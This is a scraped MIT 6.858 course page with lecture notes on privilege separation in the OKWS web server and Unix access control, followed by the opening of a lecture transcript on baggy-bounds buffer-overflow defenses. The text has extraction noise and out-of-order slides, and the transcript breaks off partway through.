        <slide>
          <slideno>5</slideno>
          <text>o okd: intercept/modify all user HTTP reqs/responses, steal passwords.
attack surface: parsing	&#13; the first	&#13; line of HTTP	&#13; request; control	&#13; 
requests.
o	 pubd: corrupt templates, leverage
to maybe exploit bug in some service?
attack surface: requests to fetch templates
from	&#13; okd.
o	 oklogd: corrupt/ignore/remove/falsify log entries
attack surface: log messages from	&#13; okd, okld, svcs
o	 service:
send garbage to user, access data for svc (modulo dbproxy)
attack surface: HTTP requests from	&#13; users (+ control msgs from	&#13; 
okd)
o dbproxy:	&#13; access/change	&#13; all user	&#13; data in the	&#13; database	&#13; it's	&#13; talking	&#13; to
attack surface: requests from	&#13; authorized services
,	&#13; requests from	&#13; 
unauthor
ized services (easy	&#13; to drop)
	 OS kernel is part of the attack surface once a single service is compromised.
o	 Linux kernel vulnerabilities rare, but still show up several times a year.
	 OKWS assumes
developer does the right thing at design level (maybe not impl):
o	 Split web application into separate services (not clump all into one).
o	 Define	&#13; precise	&#13; p
rotocols	&#13; for DB proxy	&#13; (otherwise	&#13; any	&#13; service gets	&#13; any	&#13; 
data).
	 Performance?
o	 Seems
better than most alternatives.
o	 Better performance under load (so,
resists DoS attacks to some extent)
	 How does OKWS compare
to Apache?
o Overall,	&#13; better design.
o okld runs as root, vs. nothing
in Apache, but probably minor.
o	 Neither	&#13; has	&#13; a great solution	&#13; to	&#13; client -side	&#13; vulnerab ilities (XSS,	&#13; ..)
	 How might an adversary try to compromise a system	&#13; like OKWS?
o	 Exploit buffer overflows or other vulnerabilities in C++ code.
o	 Find a SQL injection attack
in some dbproxy.
o	 Find	&#13; logic	&#13; 
bugs	&#13; in service code.
o Find	&#13; cross-site	&#13; scripting	&#13; vulnerabilities.
How successful is O
KWS?
 Problems described in the paper are still pretty common.
 okcupid.com	&#13; still runs OKWS, but doesn't seem	&#13; to
be used by other sites.
	 C++ might not be a great choice for writing web applications.
o	 For many web applications, getting C++ performance might not becritical.
o	 Design shou
ld	&#13; be	&#13; applicable	&#13; to	&#13; other	&#13; languages	&#13; too	&#13; (Python, etc).
o	 Infact,	&#13; zookw
s	&#13; for labs	&#13; in 6.858 is inspired	&#13; by	&#13; OKWS,	&#13; runs	&#13; Python	&#13; code.
	 DB proxy	&#13; idea
hasn't taken off, for typical web applications.
o	 ButDB proxy	&#13; is critical to	&#13; restrict what data a service can access	&#13; in
OKWS.
o	 Why? Requires developers to define
these APIs: extra work, gets in the
way.
6</text>
        </slide>
        <slide>
          <slideno>4</slideno>
          <text>Why does okld need to run	&#13; as root?	&#13;  (Port	&#13; 80,	&#13; chroot/setuid.)
	 What	&#13; does it	&#13; take for okld to launch a service?
o	 Create	&#13; socket pairs
o	 Get new socket t
o	&#13; oklogd
o	 fork,	&#13; setuid/
setgid,	&#13; exec	&#13; the	&#13; service
o	 Pass control socket
s	&#13; to	&#13; okd
	 What's the
point	&#13; of oklogd?
	 What's the point	&#13; of pubd?
	 Why do we need a database proxy?
o	 Ensure that each service cannot fetch other data, if it is compromised.
DB proxy	&#13; prot
ocol defined	&#13; by	&#13; app developer, depending on what
app requires.
One likely -common kind of proxy is a templatized SQL query.
Proxy	&#13; enforces overall query structure	&#13; (select,	&#13; update), but allows
client to fill in query
parameters.
o	 Where does the 20 -byte token come from? Passed as arguments to
service.
o	 Who checks the token?	&#13;  DB	&#13; proxy has list	&#13; of toke ns (&amp; allowed queries?)
o	 Who generates token? Not clear; manual by system	&#13; administrator?
o	 What if token disclosed? C
ompromised component could issue queries.
	 Table 1: why are all
services and okld in the same chroot? Is it a problem?
o	 How would we decid e?	&#13;  What	&#13; are the readable,	&#13; writable files there?
o	 Readable: shared	&#13; libraries	&#13; containing service	&#13; code.
o
	 Writable: each service can	&#13; write to its own	&#13; /cores/&lt;uid&gt;.
o	 Where's the config file? /etc/okws_config,
kept in memory by okld.
o	 oklogd	&#13; &amp; pubd	&#13; have	&#13; separate chroots because they have important state:
oklogd's chroot contains the log file,
want to ensure it's not modified.
pubd's chroot contains the templates, want to avoid disclosing them	&#13; (?).
	 Why does OKWS need a separate GID for every service?
o	 Need to execute binary, but file ownership allows chmod.
o	 Solution: binaries owned by root,
service is group owner, mode 0410.
o	 Why 0410 (user read,	&#13; group	&#13; execute),	&#13; and not	&#13; 0510 (user read &amp; exec)?
	 Why not	&#13; pro
cess per user?	&#13;  Is per user strictly better?	&#13;  user X se rvice?
o	 Per-service isolation probably made sense for okcupid given their apps.
(i.e. perhaps	&#13; they	&#13; need a lot of sharing	&#13; between	&#13; users anyway?)
o	 Per-user isolation requires allocating UIDs per user, complicating okld,
and reducing performance (though may still be OK for some use cases).
Does OKWS achieve	&#13; 
its	&#13; goal?
	 What attacks from	&#13; the list of typical web attacks does OKWS solve, and how?
o	 Most	&#13; things other than	&#13; XSS are addressed.
o	 XSS sort -of
addressed through using specialized template routines.
	 What's the effect of each component being compromised, and "attack surface"?
o	 okld: root access to web server machine, but maybe not to DB.
attack surface: small (no user input
other than svc exit).
5</text>
        </slide>
        <slide>
          <slideno>0</slideno>
          <text>6.858 Lecture 4
OKWS
Administrivia:
Lab 1 due	&#13; this	&#13; Friday.
Today's	&#13; lecture: How to	&#13; build	&#13; a secure web server on Unix. The design of our lab
web	&#13; server,	&#13; zookws,	&#13; is inspired by OKWS.
Privilege separation
	 Big	&#13; security	&#13; idea
	 Split system	&#13; into modules, each with their o wn	&#13; privilege
o Idea: if one module is compromised, then other modules won't be
	 Use often:
o	 Virtual
machines (e.g., run web site in its own virtual machine)
o	 SSH (seperates	&#13; sshd, agent)
	 Chal
leng
es:
o	 Modules need to share
o	 Need OS	&#13; sup
port
o	 Need to	&#13; use	&#13;  OS
carefully	&#13; to s et	&#13; things up correctly
o Performance
OKWS	 Interesting	&#13; case	&#13; study	&#13; of privilege	&#13; separation
o	 Lots	&#13; of sharing between services
strict partit 
ioning	&#13; doesn't work
o	 Lots	&#13; of code
	 Not widely	&#13; u
sed	&#13; outside	&#13; of OKcupid
o	 Many web	&#13; sites have their privilege separation	&#13; p lan
o But no papers describing	&#13; their plans
Background: security and protection
in Unix
Typical principals:	&#13; user IDs, group IDs (32 -bit	&#13; integers ).
	 Each process has a user ID (uid),	&#13; and a list	&#13; of group	&#13; IDs (gid + grouplist).
	 For mostly-historical reasons, a process	&#13; ha s	&#13; a gid	&#13; + extra grouplist.
 Superuser principal (root) represented by uid=0, bypasses most checks.
What	&#13; are the obje
cts + ops in	&#13; Unix,	&#13; and how	&#13; does the OS do access control?
1. Files, directories.	 File	&#13; operations:	&#13; read, write, execute, cha nge perms, ..
	 Directory operations: lookup, create,
remove, rename, change perms, ..
	 Each inode	&#13; has an owner user and group.
	 Each inode has read, write, execute perms for user, group, others.
	 Typically	&#13; represented	&#13; as	&#13; a bit vector	&#13; written	&#13; base	&#13; 8 (octal); octal	&#13; works well	&#13; 
because each
digit	&#13; is 3 bits (read,	&#13; write,	&#13; exec).
1</text>
        </slide>
        <slide>
          <slideno>6</slideno>
          <text>o Can	&#13; be hard to precisely define the allowed DB queries ahead of time. 
(Although if it's hard, might be a flag	&#13; that security	&#13; policy	&#13; is fuzzy.) 
	 Some work on privilege separation for Apache (though still hard to use). 
o	 Unix makes it hard for non-root	&#13; users to manipulate user IDs. 
o	 Performance is a concern (running
a separate process for each request). 
	 scripts.mit.edu	&#13; has a similar design, running scripts under different UIDs. 
o	 Mostly worried about isolating users from one another. 
o	 Paranoid web app devel
oper	&#13; can creat e	&#13; separate	&#13; locker	&#13; for each 
component. 
	 Sensitive systems do partitioning at a coarser granularity. 
o	 Credit	&#13; card processing companies split credit card data vs. everything
else. 
o	 Use virtual machines or physical machine isolation to split apps, DBs, .. 
How	&#13; could you integrate modern Web
application frameworks with OKWS?
	 Need to	&#13; help okd figure	&#13; out how to	&#13; route	&#13; requests	&#13; to	&#13; services. 
	 Need to implement DB proxies, or some variant thereof, to protect data. 
o	 Depends on how amenable the app code is to static analysis. 
o	 Or need to ask programmer to annotate services w/ queries they can run. 
	 Need to ensure
app code can	&#13; run	&#13; in	&#13; separate processes (probably OK). 
References:
	 http://css.csail.mit.edu/6.858/2014/readings/setuid.pdf 
	 http://httpd.apache.org/docs/trunk/suexec.html 
7</text>
        </slide>
        <slide>
          <slideno>3</slideno>
          <text>Back to OKWS: what's	&#13; their application / motivation?
Dating web site:	&#13; worried	&#13; about data secrecy.
Not so worried about adversary breaking in and sending spam.
Lots	&#13; of server-side code execution: matching, profile updates, ...
Must	&#13; have sharing between users (e.g. matching) -- cannot just partition.
Good summary of overall
plan: "aspects most vulnerable to attack are least
useful	&#13; to attackers
"
Why is this h
ard?
Unix makes it tricky to reduce privileges (chroot, UIDs, ..)
Applications need to share state in complicated ways.
Unix and SQL databases	&#13; don't have fine -grained sharing control mechanisms.
How does OKW
S partition the	&#13; web server? (Figure 1 in paper)
How does a request flow in this	&#13; web server?
okd -&gt; oklogd
-&gt; pubd
-&gt; svc -&gt; dbproxy
-&gt; oklogd
 
How does this design map onto physical machines?
oProbably many front-end machines (okld, okd, pubd, oklogd, svc)
oSeveral DB machines (dbproxy, DB)
How do these components interact?
okl
d	&#13; sets	&#13; up socketpairs	&#13; (bidirectional pipes)	&#13; for each	&#13; service.
oOne socketpair for control	&#13; RPC requests (e.g.,	&#13; "get	&#13; a new	&#13; log	&#13; socketpair").
oOne socketpair for logging (okld has
to get it from	&#13; oklogd first via RPC).
oFor HTTP services: one	&#13; sock
etpair	&#13; for forwarding HTTP connections.
oFor okd:	&#13; the	&#13; server-side	&#13; FDs for HTTP services' socketpairs	&#13; (HTTP+RPC).
okd	&#13; listens	&#13; on a separate	&#13; socket for control requests	&#13; (repub,	&#13; relaunch).
oSeems to be port 11277
in Figure 1, but a Unix domain socket in OKWS
code.
oFor repub, ok
dtalks to pubd to generate new templates, th en	&#13; sends
generated templates to each service via RPC control channel.
Services	&#13; talk to DB	&#13; proxy	&#13; ov er TCP (connect by port number).
How
does OKWS enforce isolation between components in Figure 1?
Each service	&#13; run s	&#13; as	&#13; a separat e	&#13; UID	&#13; and	&#13; GID.
chroot used to confine each process to a separate directory (almost).
Components communicate via pipes (or rather, Unix domain socket pairs).
File	&#13; descriptor	&#13; passing used	&#13; to	&#13; pass	&#13; around	&#13; HTTP connections.
What's the point	&#13; of okl d?
Why isn't okld the same as okd?
4</text>
        </slide>
        <slide>
          <slideno>1</slideno>
          <text>Who can change permissions on files? Only user owner (process UID).
	 Hard link to file: need write permission to file.
o	 Possible	&#13; rationale:	&#13; quotas.
o	 Possible	&#13; rationale:	&#13; prevent
hard -linking	&#13; / etc/passwd to /var/mail/root,
wi
th a world-writable /var/mail.
	 Execute for directory means being able to lookup names (but not ls).
	 Checks	&#13; for process	&#13; opening file	&#13; /etc/passwd:
o	 Must	&#13; be able to look	&#13; up 'etc' in	&#13; /, 'passwd' in	&#13; /etc.
o	 Must	&#13; be able to o
pen	&#13; /etc/passwd (read or read -write).

 Suppose you want file readable	&#13; to intersection	&#13; of group1	&#13; and group2.o	 Is it possible to implement this in Unix?
2. File	&#13; descriptors.

	 File access control checks performed at file open.
	 Once process has an open	&#13; file descriptor,	&#13; can continue	&#13; accessing.
	 Processes can pass file descriptors
(via Unix domain sockets).
3. Processes.
	 What	&#13; can	&#13; you	&#13; do to a process?
o	 debug	&#13; (ptrace),	&#13; send signal,	&#13; wait for exit &amp; get status,	&#13; ..
	 Debugging, sending signals: must have
same UID (almost).
o	 Various	&#13; exceptions,	&#13; this	&#13; gets	&#13; tricky	&#13; in practice.
	 Waiting / getting exit status:
must be parent of that process.
4. Memory.
	 One process cannot generally name memory in another process.
	 Exception: debug mechanisms.
	 Exception: memory-mapped files.
5. Networking.	 Operations:
o	 bind to a port
o	 connect to some address
o	 rea
d/w
rite	&#13; a connection
o	 send/receive	&#13; raw p
ackets
	 Rules:o only	&#13; root (UID 0) ca
n	&#13; bind	&#13; t
o	&#13; ports	&#13; below 1024; (e.g., arbitrary	&#13; user
cannot run a web server on port 80.)
o only	&#13; root can	&#13; send/receive raw pa
ckets.
o	 any process can co nnect	&#13; to any address.
o	 can onl
y	&#13; read/write	&#13; data	&#13; on connection	&#13; that a process has an fd for.
 Additionally, firewall imposes its own
checks, unrelated to processes.
How does	&#13; the principal of a process	&#13; get set?
	 System	&#13; calls: setuid(), setgid(), setgroups().
 Only root (UID 0) can call these system	&#13; calls (to first approximation).
Where does the user ID, group ID
list come from?
	 On a typical Unix system, login program	&#13; runs as root (UID 0)
	 Checks	&#13; supplied	&#13; user	&#13; password	&#13; against /etc/shadow.
2</text>
        </slide>
      </slides>
      <videos>
        <video>
          <video_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/resources/lecture-3-buffer-overflow-exploits-and-defenses/</video_url>
          <video_title>Lecture 3: Buffer Overflow Exploits and Defenses</video_title>
          <transcript>
            <slice>
              <time_slice>0:00</time_slice>
              <text_slice>The following content is
provided under a Creative</text_slice>
            </slice>
            <slice>
              <time_slice>0:02</time_slice>
              <text_slice>Commons license.</text_slice>
            </slice>
            <slice>
              <time_slice>0:03</time_slice>
              <text_slice>Your support will help
MIT OpenCourseWare</text_slice>
            </slice>
            <slice>
              <time_slice>0:06</time_slice>
              <text_slice>continue to offer high quality
educational resources for free.</text_slice>
            </slice>
            <slice>
              <time_slice>0:10</time_slice>
              <text_slice>To make a donation, or to
view additional materials</text_slice>
            </slice>
            <slice>
              <time_slice>0:12</time_slice>
              <text_slice>from hundreds of MIT courses,
visit MIT OpenCourseWare</text_slice>
            </slice>
            <slice>
              <time_slice>0:16</time_slice>
              <text_slice>at ocw.mit.edu.</text_slice>
            </slice>
            <slice>
              <time_slice>0:25</time_slice>
              <text_slice>PROFESSOR: All right,
let's get started.</text_slice>
            </slice>
            <slice>
              <time_slice>0:27</time_slice>
              <text_slice>So welcome to the next
lecture about exploiting</text_slice>
            </slice>
            <slice>
              <time_slice>0:33</time_slice>
              <text_slice>buffer overflow.</text_slice>
            </slice>
            <slice>
              <time_slice>0:33</time_slice>
              <text_slice>So today, what we're
going to do is,</text_slice>
            </slice>
            <slice>
              <time_slice>0:35</time_slice>
              <text_slice>we're going to finish up our
discussion about baggy bounds</text_slice>
            </slice>
            <slice>
              <time_slice>0:38</time_slice>
              <text_slice>and then we're going
to move on to a couple</text_slice>
            </slice>
            <slice>
              <time_slice>0:40</time_slice>
              <text_slice>of other different techniques
for protecting its buffer</text_slice>
            </slice>
            <slice>
              <time_slice>0:44</time_slice>
              <text_slice>overflows.</text_slice>
            </slice>
            <slice>
              <time_slice>0:45</time_slice>
              <text_slice>Then we're going to talk
about the paper for today,</text_slice>
            </slice>
            <slice>
              <time_slice>0:48</time_slice>
              <text_slice>which is the blind return
oriented programming.</text_slice>
            </slice>
            <slice>
              <time_slice>0:51</time_slice>
              <text_slice>So if you were like me when
you first read that paper</text_slice>
            </slice>
            <slice>
              <time_slice>0:53</time_slice>
              <text_slice>you kind of felt like you were
watching like a Christopher</text_slice>
            </slice>
            <slice>
              <time_slice>0:55</time_slice>
              <text_slice>Nolan movie at the beginning.</text_slice>
            </slice>
            <slice>
              <time_slice>0:56</time_slice>
              <text_slice>It was kind of like
mind blowing right.</text_slice>
            </slice>
            <slice>
              <time_slice>0:58</time_slice>
              <text_slice>So what we're going
to do is we're</text_slice>
            </slice>
            <slice>
              <time_slice>0:59</time_slice>
              <text_slice>going to actually step through
how some of these gadgets</text_slice>
            </slice>
            <slice>
              <time_slice>1:01</time_slice>
              <text_slice>work right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02</time_slice>
              <text_slice>And so hopefully
by the end, you'll</text_slice>
            </slice>
            <slice>
              <time_slice>1:03</time_slice>
              <text_slice>be able to understand all this
sort of high tech chicanery</text_slice>
            </slice>
            <slice>
              <time_slice>1:05</time_slice>
              <text_slice>that they're doing in the paper.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08</time_slice>
              <text_slice>So first of all,
like I said, let's</text_slice>
            </slice>
            <slice>
              <time_slice>1:09</time_slice>
              <text_slice>just close up with the
baggy bounds discussions.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13</time_slice>
              <text_slice>Let's go through a very
simple example here.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18</time_slice>
              <text_slice>So let's say that we're going
to define a pointer called P.</text_slice>
            </slice>
            <slice>
              <time_slice>1:26</time_slice>
              <text_slice>And let's say that
we're going to give it</text_slice>
            </slice>
            <slice>
              <time_slice>1:28</time_slice>
              <text_slice>allocation size of 44.</text_slice>
            </slice>
            <slice>
              <time_slice>1:30</time_slice>
              <text_slice>Let's also assume that the
slot size equals 16 bytes OK.</text_slice>
            </slice>
            <slice>
              <time_slice>1:37</time_slice>
              <text_slice>So what's going to happen when
we do this malloc up here?</text_slice>
            </slice>
            <slice>
              <time_slice>1:40</time_slice>
              <text_slice>So as you know, the
baggy bounds system</text_slice>
            </slice>
            <slice>
              <time_slice>1:42</time_slice>
              <text_slice>is going to pad that allocation
out to the next power of two,</text_slice>
            </slice>
            <slice>
              <time_slice>1:46</time_slice>
              <text_slice>right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:46</time_slice>
              <text_slice>So even though we've only
allocated 44 bytes here,</text_slice>
            </slice>
            <slice>
              <time_slice>1:49</time_slice>
              <text_slice>we're actually going to allocate
64 bytes for this pointer</text_slice>
            </slice>
            <slice>
              <time_slice>1:54</time_slice>
              <text_slice>up here.</text_slice>
            </slice>
            <slice>
              <time_slice>1:56</time_slice>
              <text_slice>And so also note too, this
is the slot size is 16.</text_slice>
            </slice>
            <slice>
              <time_slice>1:59</time_slice>
              <text_slice>How many bounds tables entries
are we going to create?</text_slice>
            </slice>
            <slice>
              <time_slice>2:01</time_slice>
              <text_slice>Well we're going to create
the allocation size, which</text_slice>
            </slice>
            <slice>
              <time_slice>2:04</time_slice>
              <text_slice>in this case 64, divided by
the slot size, which is 16.</text_slice>
            </slice>
            <slice>
              <time_slice>2:08</time_slice>
              <text_slice>So in this case we'll create
four different bounds table</text_slice>
            </slice>
            <slice>
              <time_slice>2:12</time_slice>
              <text_slice>entries for this
thing right here.</text_slice>
            </slice>
            <slice>
              <time_slice>2:14</time_slice>
              <text_slice>Each one of those
entries is going</text_slice>
            </slice>
            <slice>
              <time_slice>2:15</time_slice>
              <text_slice>to be set to the log of
the allocation size, which</text_slice>
            </slice>
            <slice>
              <time_slice>2:18</time_slice>
              <text_slice>in this case is
going to be 6 right.</text_slice>
            </slice>
            <slice>
              <time_slice>2:20</time_slice>
              <text_slice>Because the allocation
size is 64, OK?</text_slice>
            </slice>
            <slice>
              <time_slice>2:22</time_slice>
              <text_slice>So, so far so good.</text_slice>
            </slice>
            <slice>
              <time_slice>2:24</time_slice>
              <text_slice>Then we're going to define
another pointer called q</text_slice>
            </slice>
            <slice>
              <time_slice>2:31</time_slice>
              <text_slice>and we're going to set
it equal to p plus 60.</text_slice>
            </slice>
            <slice>
              <time_slice>2:36</time_slice>
              <text_slice>So what happens when we do this?</text_slice>
            </slice>
            <slice>
              <time_slice>2:38</time_slice>
              <text_slice>Well note that
strictly speaking,</text_slice>
            </slice>
            <slice>
              <time_slice>2:40</time_slice>
              <text_slice>this access is out
of bounds, right.</text_slice>
            </slice>
            <slice>
              <time_slice>2:43</time_slice>
              <text_slice>Because this was only
allocated 44 bytes of memory,</text_slice>
            </slice>
            <slice>
              <time_slice>2:45</time_slice>
              <text_slice>but of course the way
that baggy bounds works</text_slice>
            </slice>
            <slice>
              <time_slice>2:47</time_slice>
              <text_slice>is that it will actually allow
axises that are out of bounds,</text_slice>
            </slice>
            <slice>
              <time_slice>2:50</time_slice>
              <text_slice>if they stay within
that baggy bounds.</text_slice>
            </slice>
            <slice>
              <time_slice>2:52</time_slice>
              <text_slice>So even though
strictly speaking,</text_slice>
            </slice>
            <slice>
              <time_slice>2:53</time_slice>
              <text_slice>the programmer probably
shouldn't have done this,</text_slice>
            </slice>
            <slice>
              <time_slice>2:55</time_slice>
              <text_slice>this is actually
going to be OK, right.</text_slice>
            </slice>
            <slice>
              <time_slice>2:57</time_slice>
              <text_slice>We're not going to raise any
flags or anything like that.</text_slice>
            </slice>
            <slice>
              <time_slice>3:01</time_slice>
              <text_slice>Now let's say that
the next thing we do</text_slice>
            </slice>
            <slice>
              <time_slice>3:04</time_slice>
              <text_slice>is we need to find another
pointer, which is going to be</text_slice>
            </slice>
            <slice>
              <time_slice>3:09</time_slice>
              <text_slice>set equal to q plus 16 right.</text_slice>
            </slice>
            <slice>
              <time_slice>3:14</time_slice>
              <text_slice>Now this is actually going
to cause an error, right.</text_slice>
            </slice>
            <slice>
              <time_slice>3:21</time_slice>
              <text_slice>Because now q is at an offset
of 60 plus 16, which equals 76.</text_slice>
            </slice>
            <slice>
              <time_slice>3:31</time_slice>
              <text_slice>So this is actually 12
bytes away from the end</text_slice>
            </slice>
            <slice>
              <time_slice>3:34</time_slice>
              <text_slice>of that baggy bounds.</text_slice>
            </slice>
            <slice>
              <time_slice>3:36</time_slice>
              <text_slice>OK?</text_slice>
            </slice>
            <slice>
              <time_slice>3:36</time_slice>
              <text_slice>And that's actually greater
than half a slot away.</text_slice>
            </slice>
            <slice>
              <time_slice>3:39</time_slice>
              <text_slice>All right, so if you remember
the baggy bounds system will</text_slice>
            </slice>
            <slice>
              <time_slice>3:42</time_slice>
              <text_slice>actually throw a hard
synchronous error if you</text_slice>
            </slice>
            <slice>
              <time_slice>3:44</time_slice>
              <text_slice>get beyond 1/2 a slot from
the edge of that baggy bounds.</text_slice>
            </slice>
            <slice>
              <time_slice>3:47</time_slice>
              <text_slice>So this will actually
cause the program to fail.</text_slice>
            </slice>
            <slice>
              <time_slice>3:49</time_slice>
              <text_slice>This will actually make it stop.</text_slice>
            </slice>
            <slice>
              <time_slice>3:51</time_slice>
              <text_slice>Now let's imagine that we
didn't have this line of code</text_slice>
            </slice>
            <slice>
              <time_slice>3:54</time_slice>
              <text_slice>in the program, OK.</text_slice>
            </slice>
            <slice>
              <time_slice>3:55</time_slice>
              <text_slice>So we had these two, but
we don't have this one.</text_slice>
            </slice>
            <slice>
              <time_slice>3:57</time_slice>
              <text_slice>So what if we instead
of doing this line,</text_slice>
            </slice>
            <slice>
              <time_slice>4:00</time_slice>
              <text_slice>did something that
looks like this.</text_slice>
            </slice>
            <slice>
              <time_slice>4:02</time_slice>
              <text_slice>We declare another
pointer, let's call it s,</text_slice>
            </slice>
            <slice>
              <time_slice>4:06</time_slice>
              <text_slice>and we set it equal to q plus 8.</text_slice>
            </slice>
            <slice>
              <time_slice>4:11</time_slice>
              <text_slice>Now in this case,
the pointer is going</text_slice>
            </slice>
            <slice>
              <time_slice>4:14</time_slice>
              <text_slice>to be at 60 plus 8, which equals
68 bytes away from p, right.</text_slice>
            </slice>
            <slice>
              <time_slice>4:22</time_slice>
              <text_slice>So this is only four bytes
beyond that baggy bound.</text_slice>
            </slice>
            <slice>
              <time_slice>4:25</time_slice>
              <text_slice>So this will not
actually cause an error.</text_slice>
            </slice>
            <slice>
              <time_slice>4:28</time_slice>
              <text_slice>Even though it is strictly
speaking, out of bounds.</text_slice>
            </slice>
            <slice>
              <time_slice>4:30</time_slice>
              <text_slice>What we will do here though,
is set that high order</text_slice>
            </slice>
            <slice>
              <time_slice>4:33</time_slice>
              <text_slice>bit on the pointer, right.</text_slice>
            </slice>
            <slice>
              <time_slice>4:34</time_slice>
              <text_slice>So that if anyone
subsequently tries</text_slice>
            </slice>
            <slice>
              <time_slice>4:36</time_slice>
              <text_slice>to dereference this
thing, it's going</text_slice>
            </slice>
            <slice>
              <time_slice>4:38</time_slice>
              <text_slice>to cause a hard
fault at that point.</text_slice>
            </slice>
            <slice>
              <time_slice>4:41</time_slice>
              <text_slice>And then let's say, the
final thing that we do</text_slice>
            </slice>
            <slice>
              <time_slice>4:44</time_slice>
              <text_slice>is we declare another
pointer t, which</text_slice>
            </slice>
            <slice>
              <time_slice>4:51</time_slice>
              <text_slice>is going to equal s minus 32.</text_slice>
            </slice>
            <slice>
              <time_slice>4:56</time_slice>
              <text_slice>So what happens here
is that essentially we</text_slice>
            </slice>
            <slice>
              <time_slice>4:58</time_slice>
              <text_slice>brought this pointer t, it
is now back in bounds, right.</text_slice>
            </slice>
            <slice>
              <time_slice>5:02</time_slice>
              <text_slice>So what that means is that
even though this guy was out</text_slice>
            </slice>
            <slice>
              <time_slice>5:06</time_slice>
              <text_slice>of bounds, now we sort of going
back to the original allocated</text_slice>
            </slice>
            <slice>
              <time_slice>5:09</time_slice>
              <text_slice>region, that we originally
created up here.</text_slice>
            </slice>
            <slice>
              <time_slice>5:11</time_slice>
              <text_slice>So as a result, t will not
have that high order bit step</text_slice>
            </slice>
            <slice>
              <time_slice>5:14</time_slice>
              <text_slice>and so you can dereference T
and everything will be fine.</text_slice>
            </slice>
            <slice>
              <time_slice>5:17</time_slice>
              <text_slice>So does this all make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>5:18</time_slice>
              <text_slice>This should be fairly
straightforward.</text_slice>
            </slice>
            <slice>
              <time_slice>5:20</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE]
the difference</text_slice>
            </slice>
            <slice>
              <time_slice>5:22</time_slice>
              <text_slice>between r and s, how
would you know that r is--</text_slice>
            </slice>
            <slice>
              <time_slice>5:25</time_slice>
              <text_slice>or how does the program know
that r is 1/2 the [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>5:31</time_slice>
              <text_slice>PROFESSOR: So note
that, like up here,</text_slice>
            </slice>
            <slice>
              <time_slice>5:34</time_slice>
              <text_slice>when we create r you
can basically interpose,</text_slice>
            </slice>
            <slice>
              <time_slice>5:39</time_slice>
              <text_slice>we get an instrumented
code that's</text_slice>
            </slice>
            <slice>
              <time_slice>5:40</time_slice>
              <text_slice>going to be working at all
of these pointer operations.</text_slice>
            </slice>
            <slice>
              <time_slice>5:44</time_slice>
              <text_slice>So basically we can tell is that
we know where P is going to be.</text_slice>
            </slice>
            <slice>
              <time_slice>5:48</time_slice>
              <text_slice>I'm sorry, we know
where q is going to be.</text_slice>
            </slice>
            <slice>
              <time_slice>5:51</time_slice>
              <text_slice>And we know that q is
within those baggy bounds.</text_slice>
            </slice>
            <slice>
              <time_slice>5:57</time_slice>
              <text_slice>And so when we do
this operation here,</text_slice>
            </slice>
            <slice>
              <time_slice>5:59</time_slice>
              <text_slice>the instrumentation
of baggy bounds</text_slice>
            </slice>
            <slice>
              <time_slice>6:01</time_slice>
              <text_slice>adds and we're able
to say, aha, well I</text_slice>
            </slice>
            <slice>
              <time_slice>6:03</time_slice>
              <text_slice>know where that source
formula is coming from.</text_slice>
            </slice>
            <slice>
              <time_slice>6:05</time_slice>
              <text_slice>And then if you look
at this offset here,</text_slice>
            </slice>
            <slice>
              <time_slice>6:07</time_slice>
              <text_slice>you determine it's more than a
1/2 slot away from slot side.</text_slice>
            </slice>
            <slice>
              <time_slice>6:11</time_slice>
              <text_slice>So basically what
you think about is</text_slice>
            </slice>
            <slice>
              <time_slice>6:12</time_slice>
              <text_slice>that as we're doing
these pointer operations,</text_slice>
            </slice>
            <slice>
              <time_slice>6:14</time_slice>
              <text_slice>and looking and saying is how
are you going out of bounds,</text_slice>
            </slice>
            <slice>
              <time_slice>6:16</time_slice>
              <text_slice>have you gone out of
bounds, yes or no.</text_slice>
            </slice>
            <slice>
              <time_slice>6:18</time_slice>
              <text_slice>At some point you're going
to have some operation that's</text_slice>
            </slice>
            <slice>
              <time_slice>6:20</time_slice>
              <text_slice>going to involve a pointer
that is either in bounds</text_slice>
            </slice>
            <slice>
              <time_slice>6:23</time_slice>
              <text_slice>within the baggy bounds and
then some thing over here that</text_slice>
            </slice>
            <slice>
              <time_slice>6:25</time_slice>
              <text_slice>makes it go out of bounds.</text_slice>
            </slice>
            <slice>
              <time_slice>6:27</time_slice>
              <text_slice>So at that moment,
right when that happens,</text_slice>
            </slice>
            <slice>
              <time_slice>6:29</time_slice>
              <text_slice>that's how we know that
something chicanerous has</text_slice>
            </slice>
            <slice>
              <time_slice>6:30</time_slice>
              <text_slice>arisen.</text_slice>
            </slice>
            <slice>
              <time_slice>6:36</time_slice>
              <text_slice>All right so, hopefully
that should all make sense.</text_slice>
            </slice>
            <slice>
              <time_slice>6:39</time_slice>
              <text_slice>And so this is very
briefly a review</text_slice>
            </slice>
            <slice>
              <time_slice>6:41</time_slice>
              <text_slice>of the homework question.</text_slice>
            </slice>
            <slice>
              <time_slice>6:44</time_slice>
              <text_slice>So hopefully you can understand
this and our homework question</text_slice>
            </slice>
            <slice>
              <time_slice>6:46</time_slice>
              <text_slice>should be pretty
easy to understand.</text_slice>
            </slice>
            <slice>
              <time_slice>6:48</time_slice>
              <text_slice>So we have a character pointer
the malloc had 256 bytes to it,</text_slice>
            </slice>
            <slice>
              <time_slice>6:56</time_slice>
              <text_slice>Then we declare a
character pointer</text_slice>
            </slice>
            <slice>
              <time_slice>6:59</time_slice>
              <text_slice>q, that is equal to
that pointer plus 256</text_slice>
            </slice>
            <slice>
              <time_slice>7:06</time_slice>
              <text_slice>and then we essentially try
to dereference this pointer.</text_slice>
            </slice>
            <slice>
              <time_slice>7:11</time_slice>
              <text_slice>So what's going to happen?</text_slice>
            </slice>
            <slice>
              <time_slice>7:12</time_slice>
              <text_slice>Well note that this is an
exact power too, right.</text_slice>
            </slice>
            <slice>
              <time_slice>7:15</time_slice>
              <text_slice>So there's not actually any
bagginess in the bounds, right.</text_slice>
            </slice>
            <slice>
              <time_slice>7:18</time_slice>
              <text_slice>So when we do this right here,
this makes q point to one</text_slice>
            </slice>
            <slice>
              <time_slice>7:23</time_slice>
              <text_slice>pass the end of
those baggy bounds.</text_slice>
            </slice>
            <slice>
